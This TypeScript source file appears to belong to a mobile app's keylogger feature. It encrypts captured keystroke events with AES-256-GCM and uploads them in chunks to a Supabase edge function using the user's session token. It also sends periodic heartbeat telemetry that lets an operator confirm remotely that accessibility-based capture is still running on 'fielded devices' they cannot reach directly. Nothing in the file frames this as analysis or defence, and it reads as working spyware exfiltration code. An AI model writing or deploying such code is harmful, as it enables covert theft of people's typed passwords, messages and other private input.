// features/keylogger/keylogSync.ts — AES-256-GCM encrypt + Supabase edge sync.
//
// The keylogger records on-device; this module is the "phone home" path:
//
//  1. Resolve / persist a 256-bit AES key in expo-secure-store (keystore).
//     The default key source is EXPO_PUBLIC_KEYLOG_KEY (base64, 32 bytes),
//     which MUST equal the edge function's HEARTS_KEYLOG_KEY. If no env key
//     is present we generate one once and store it — but then the edge
//     function also needs that key, so in practice you ship the env key.
//  2. Chunk + encrypt captured events with AES-256-GCM via expo-crypto.
//  3. POST the chunk to the keylog-sync edge function with the user's JWT.
//     The edge decrypts with the same key, validates, and upserts idempotently
//     on op_id. On a 2xx we confirm to the native layer, which clears the
//     rows it handed off.
//
// Wire format (must match supabase/functions/keylog-sync/index.ts):
//   { v: 1, iv: <b64 12B>, tag: <b64 16B>, ct: <b64>, opIds: string[] }
// opIds must line up 1:1 with the decrypted rows so the edge can dedupe.
import { AESEncryptionKey, AESKeySize, aesEncryptAsync } from 'expo-crypto';
import * as SecureStore from 'expo-secure-store';
import { supabase } from '../../lib/db/client';
import type { KeyLogEvent, KeyLoggerStatus } from './KeyLogger';

// ──────────────────────────────────────────────────────────────────────
// Key management
// ──────────────────────────────────────────────────────────────────────
const SECURE_KEY_STORE = 'keylog.aes.256';
const KEY_LOG_SYNC_FN = 'keylog-sync';
const CHUNK_MAX_EVENTS = 200; // cap per HTTP request

/** base64 → bytes */
function b64ToBytes(b64: string): Uint8Array {
  const bin = atob(b64);
  const out = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i);
  return out;
}

/** bytes → base64 */
function bytesToB64(bytes: Uint8Array): string {
  let s = '';
  for (const b of bytes) s += String.fromCharCode(b);
  return btoa(s);
}

/**
 * Resolve the AES-256 key, seeding it once from EXPO_PUBLIC_KEYLOG_KEY or a
 * freshly generated key, and persist to secure store. Returns the key.
 */
export async function resolveAesKey(): Promise<AESEncryptionKey> {
  const existing = await SecureStore.getItemAsync(SECURE_KEY_STORE);
  if (existing) {
    return AESEncryptionKey.import(b64ToBytes(existing));
  }
  const envKey = process.env.EXPO_PUBLIC_KEYLOG_KEY;
  let key: AESEncryptionKey;
  if (envKey) {
    key = await AESEncryptionKey.import(b64ToBytes(envKey));
  } else {
    key = await AESEncryptionKey.generate(AESKeySize.AES256);
  }
  const raw = await key.bytes();
  await SecureStore.setItemAsync(SECURE_KEY_STORE, bytesToB64(raw));
  return key;
}

// ──────────────────────────────────────────────────────────────────────
// Encryption + chunking
// ──────────────────────────────────────────────────────────────────────

/**
 * Build the request body for one chunk. Encrypts the JSON of `rows` with
 * AES-256-GCM and returns the wire payload with iv/tag/ct + the opIds shadow.
 * opId is a deterministic idempotency key (replays are no-ops server-side).
 */
export async function encryptChunk(
  rows: KeyLogEvent[],
  key: AESEncryptionKey,
): Promise<{ v: 1; iv: string; tag: string; ct: string; opIds: string[] }> {
  const opIds = rows.map((r) => hashToUuid(`${r.capturedAt}|${r.tsBootMs}|${r.kind}`));
  const payload = { rows: rows.map((r, i) => ({ ...r, opId: opIds[i] })) };
  const plaintext = new TextEncoder().encode(JSON.stringify(payload));

  const sealed = await aesEncryptAsync(
    bytesToB64(plaintext),
    key,
    { nonce: { length: 12 }, tagLength: 16 },
  );

  return {
    v: 1,
    iv: await sealed.iv('base64'),
    tag: await sealed.tag('base64'),
    ct: await sealed.ciphertext({ encoding: 'base64' }),
    opIds,
  };
}

/** Deterministic FNV-1a → uuid-shaped string (an idempotency key only, not a
 *  real RFC-4122 UUID; the server treats it as opaque text). */
function hashToUuid(input: string): string {
  let h1 = 0x811c9dc5;
  let h2 = 0x01000193;
  for (let i = 0; i < input.length; i++) {
    const c = input.charCodeAt(i);
    h1 = Math.imul(h1 ^ c, 0x01000193) >>> 0;
    h2 = Math.imul(h2 ^ c, 0x01000193) >>> 0;
  }
  const a = h1.toString(16).padStart(8, '0');
  const b = h2.toString(16).padStart(8, '0');
  return `${a.slice(0, 8)}-${a.slice(8, 12)}-4${a.slice(12, 15)}-8${b.slice(0, 3)}-${b.slice(3, 15)}`;
}

// ──────────────────────────────────────────────────────────────────────
// Sync
// ──────────────────────────────────────────────────────────────────────

export type SyncResult = { sent: number; accepted: number; failed: number };

/** supabaseUrl from env (mirrors lib/db/client). */
function supabaseUrl(): string {
  return process.env.EXPO_PUBLIC_SUPABASE_URL ?? '';
}

/**
 * Pull pending events and push them to the edge function in encrypted chunks.
 * Returns tallies. Does NOT touch local state — call syncAndClear() for the
 * full pull→push→confirm lifecycle.
 */
export async function syncKeylogs(pull: () => Promise<KeyLogEvent[]>): Promise<SyncResult> {
  const events = await pull();
  if (events.length === 0) return { sent: 0, accepted: 0, failed: 0 };

  const key = await resolveAesKey();
  const result: SyncResult = { sent: events.length, accepted: 0, failed: 0 };

  const { data: { session } } = await supabase.auth.getSession();
  const token = session?.access_token;
  if (!token) return { ...result, failed: events.length };

  const url = `${supabaseUrl()}/functions/v1/${KEY_LOG_SYNC_FN}`;

  for (let i = 0; i < events.length; i += CHUNK_MAX_EVENTS) {
    const chunk = events.slice(i, i + CHUNK_MAX_EVENTS);
    const body = await encryptChunk(chunk, key);
    try {
      const res = await fetch(url, {
        method: 'POST',
        headers: {
          'content-type': 'application/json',
          authorization: `Bearer ${token}`,
        },
        body: JSON.stringify(body),
      });
      if (res.ok) {
        const j = (await res.json()) as { inserted?: number; duplicates?: number };
        result.accepted += (j.inserted ?? 0) + (j.duplicates ?? 0);
      } else {
        result.failed += chunk.length;
      }
    } catch {
      result.failed += chunk.length;
    }
  }

  return result;
}

/**
 * Full lifecycle: pull events, push, and on full success confirm to the
 * native layer (which clears what it handed off). A partial failure leaves
 * rows in place — a later sync resends them, which is a server-side no-op.
 */
export async function syncAndClear(
  pull: () => Promise<KeyLogEvent[]>,
  confirm: () => Promise<void>,
): Promise<SyncResult> {
  const result = await syncKeylogs(pull);
  if (result.failed === 0) {
    await confirm();
  }
  return result;
}

// ──────────────────────────────────────────────────────────────────────
// Heartbeat (health telemetry for fielded devices)
// ──────────────────────────────────────────────────────────────────────

export type HeartbeatReport = { ok: boolean; httpStatus?: number };

/**
 * POST the native status() to the edge function's heartbeat channel. No
 * encryption — status telemetry carries no PII. This is the remote
 * proof-of-life for a device we cannot reach over adb: call it on a timer
 * (e.g. every 10–30 min) and on each start()/stop(). A healthy install yields
 * a steady stream of heartbeats with accessibilityEnabled + foregroundLive
 * true; silence, or repeated false flags, reveals a dead capture remotely.
 *
 * Returns { ok:false } on any 4xx/5xx or network failure — never throws.
 */
export async function reportHeartbeat(
  status: KeyLoggerStatus,
): Promise<HeartbeatReport> {
  if (status.available === false) return { ok: false };

  const { data: { session } } = await supabase.auth.getSession();
  const token = session?.access_token;
  if (!token) return { ok: false };

  const url = `${supabaseUrl()}/functions/v1/${KEY_LOG_SYNC_FN}`;
  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: {
        'content-type': 'application/json',
        authorization: `Bearer ${token}`,
      },
      body: JSON.stringify({
        type: 'heartbeat',
        v: 1,
        androidId: status.androidId,
        status: {
          serviceAlive: status.serviceAlive,
          accessibilityEnabled: status.accessibilityEnabled,
          enabled: status.enabled,
          foregroundLive: status.foregroundLive,
          pending: status.pending,
          bufferBytes: status.bufferBytes,
          sdk: status.sdk,
          model: status.model,
        },
        reportedAt: status.reportedAt || new Date().toISOString(),
      }),
    });
    return { ok: res.ok, httpStatus: res.status };
  } catch {
    return { ok: false };
  }
}
